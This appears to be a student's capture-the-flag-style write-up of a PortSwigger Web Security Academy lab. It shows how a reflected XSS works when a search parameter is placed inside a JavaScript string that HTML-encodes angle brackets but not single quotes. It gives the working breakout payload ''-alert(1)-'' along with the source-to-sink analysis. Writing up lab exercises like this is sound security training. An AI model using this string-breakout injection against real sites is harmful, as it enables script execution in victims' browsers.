# Reflected XSS into a JavaScript String with Angle Brackets HTML Encoded

## 1. Lab / Target

**Platform:** PortSwigger Web Security Academy  
**Vulnerability:** Reflected Cross-Site Scripting (XSS)  
**Target:** PortSwigger Web Security Academy Lab

### Objective

The objective of this lab was to identify and exploit a reflected XSS vulnerability where user-controlled input was reflected inside a JavaScript string.

The application HTML-encoded angle brackets, so I needed to find another way to break out of the JavaScript context and execute `alert(1)`.

---

## 2. Initial Reconnaissance

After opening the lab, I tested the search functionality with a simple value:

```text
test123
```

The URL became:

```text
/?search=test123
```

This showed that my input was being submitted through the `search` query parameter.

I then inspected the page source and found:

```javascript
var searchTerms = 'test123';
```

This was an important finding because my input was being reflected directly inside a JavaScript string.

The relevant code structure was:

```javascript
var searchTerms = 'USER_INPUT';
```

At this point, I knew that the `search` parameter was an interesting injection point to investigate.

### Evidence

**Screenshot 1 — Reflected Search Input**

Shows the search input being reflected into the JavaScript variable:

```javascript
var searchTerms = 'test123';
```

<p>
<img src="images/Screenshot 1.png" alt="Search input reflected inside JavaScript string">
</p>

---

## 3. Testing the JavaScript String Context

Because my input was being placed between single quotes, I wanted to test whether I could interfere with the JavaScript string.

I submitted:

```text
test'
```

The resulting JavaScript became:

```javascript
var searchTerms = 'test'';
```

The single quote I supplied was reflected directly into the JavaScript.

This was important because the application did not encode the single quote.

Therefore, I could potentially break out of the original JavaScript string.

### Evidence

**Screenshot 2 — Testing the Single Quote**

Shows the single quote being reflected directly into the JavaScript string.

<p>
<img src="images/Screenshot 2.png" alt="Testing a single quote to break out of the JavaScript string">
</p>

---

## 4. Testing Angle Brackets

I also tested an angle bracket to determine whether I could inject HTML or a new `<script>` element.

I submitted:

```text
<
```

The application changed it to:

```html
&lt;
```

This showed that angle brackets were being HTML encoded.

Therefore, an HTML-based payload such as:

```html
<script>alert(1)</script>
```

would not be suitable here.

More importantly, I realized that I was already inside an existing `<script>` block.

The important context was therefore **JavaScript**, not HTML.

### Evidence

**Screenshot 3 — Angle Bracket Encoding**

Shows the `<` character being converted to `&lt;`.

<p>
<img src="images/Screenshot 3.png" alt="Angle bracket being HTML encoded">
</p>

---

## 5. Source-to-Sink Analysis

The investigation revealed the following data flow:

```text
search query parameter
        ↓
user-controlled input
        ↓
searchTerms JavaScript variable
        ↓
JavaScript string
        ↓
JavaScript parser
        ↓
injected JavaScript
```

### Source

The source was the `search` query parameter:

```text
/?search=USER_INPUT
```

The application reflected this value into:

```javascript
var searchTerms = 'USER_INPUT';
```

### Injection Context

The important context was a JavaScript string:

```javascript
'USER_INPUT'
```

Because the input was surrounded by single quotes, I tested whether a single quote could close the existing string.

It could.

### Sink

The effective execution point was the JavaScript code containing the reflected value:

```javascript
var searchTerms = 'USER_INPUT';
```

If I could escape the string and create valid JavaScript syntax, the browser's JavaScript engine would interpret the injected code.

---

## 6. Breaking Out of the JavaScript String

At this point, I knew that I could control the value inside:

```javascript
var searchTerms = 'USER_INPUT';
```

I needed to construct valid JavaScript outside of the original string.

I started with a single quote:

```text
'
```

This closes the string created by the application.

I then needed to execute JavaScript.

I used:

```text
-alert(1)-
```

Finally, I used another single quote:

```text
'
```

The complete payload was:

```text
'-alert(1)-'
```

The application then produced:

```javascript
var searchTerms = ''-alert(1)-'';
```

The important part can be understood as:

```text
''       -       alert(1)       -       ''
│                │                    │
empty string     execute this         empty string
```

The two `''` values are empty JavaScript strings.

The important part is:

```javascript
alert(1)
```

It is no longer inside quotes.

Therefore, JavaScript interprets it as a function call rather than as a string.

The `-` operators connect the expressions and allow the resulting JavaScript to remain syntactically valid.

### Evidence

**Screenshot 4 — Breaking Out of the JavaScript String**

Shows the successful payload being reflected into the JavaScript code.

<p>
<img src="images/Screenshot 4.png" alt="Breaking out of the JavaScript string and injecting alert">
</p>

---

## 7. Proof of Concept

After loading the resulting URL, the browser executed:

```javascript
alert(1)
```

An alert dialog appeared.

This confirmed that I had successfully broken out of the JavaScript string and achieved reflected XSS.

### Evidence

**Screenshot 5 — Successful JavaScript Execution**

Shows the `alert(1)` dialog confirming successful XSS.

<p>
<img src="images/Screenshot 5.png" alt="Alert confirming successful reflected XSS">
</p>

---

## 8. Technical Analysis

The vulnerable JavaScript was:

```javascript
var searchTerms = 'USER_INPUT';
```

The application placed attacker-controlled input directly inside a JavaScript string.

The important context was therefore:

```text
JavaScript string context
```

The application did HTML-encode angle brackets:

```text
<  →  &lt;
>  →  &gt;
```

This prevented me from using an HTML-based payload.

However, the single quote was not encoded.

This allowed me to terminate the existing JavaScript string.

My payload was:

```text
'-alert(1)-'
```

After reflection, the browser received:

```javascript
var searchTerms = ''-alert(1)-'';
```

JavaScript evaluates:

```javascript
'' - alert(1) - ''
```

Because `alert(1)` is outside the string delimiters, the JavaScript engine executes it.

The key vulnerability was therefore not simply that the input was reflected.

The problem was that **attacker-controlled input was reflected into a JavaScript string without correctly escaping the JavaScript string delimiter**.

---

## 9. Impact

In a real-world application, reflected XSS could allow an attacker to execute arbitrary JavaScript in the security context of the vulnerable origin.

Depending on the application's functionality and security controls, successful exploitation could allow an attacker to:

* Manipulate page content.
* Perform actions using the victim's existing privileges.
* Access sensitive information exposed to JavaScript.
* Modify the application's UI.
* Conduct phishing or other client-side attacks.

The practical impact depends on the application's architecture, authentication model, browser protections, and the data and functionality available within the vulnerable origin.

---

## 10. Conclusion / Takeaway

This lab demonstrated why understanding the **injection context** is essential when testing for XSS.

My input was not being inserted into normal HTML.

It was being inserted into a **JavaScript string**:

```javascript
var searchTerms = 'USER_INPUT';
```

My investigation followed this process:

```text
Identify the search parameter
            ↓
Find where the input is reflected
            ↓
Identify the JavaScript string context
            ↓
Test a single quote
            ↓
Confirm the string can be broken
            ↓
Test angle-bracket encoding
            ↓
Construct valid JavaScript syntax
            ↓
Execute alert(1)
            ↓
Confirm reflected XSS
```

The final data flow was:

```text
search parameter
        ↓
reflected into JavaScript
        ↓
JavaScript string
        ↓
single quote breaks the string
        ↓
JavaScript expression
        ↓
alert(1)
        ↓
JavaScript execution
```

The main lesson I took from this lab is:

> **Understand the context before choosing the payload.**

In this case, the correct approach was not to inject an HTML `<script>` tag.

Instead, I had to understand how my input was being interpreted by the JavaScript parser and construct a valid JavaScript expression that escaped the original string.

---

## Final Payload

```text
'-alert(1)-'
```

## Vulnerability Summary

**Vulnerability:** Reflected Cross-Site Scripting (XSS)

**Source:** `search` query parameter

**Context:** JavaScript string

**Injection point:**

```javascript
var searchTerms = 'USER_INPUT';
```

**Protection observed:** Angle brackets were HTML encoded.

**Missing protection:** The single quote was not properly escaped for the JavaScript string context.

**Result:** I was able to break out of the JavaScript string and execute arbitrary JavaScript in the victim's browser.
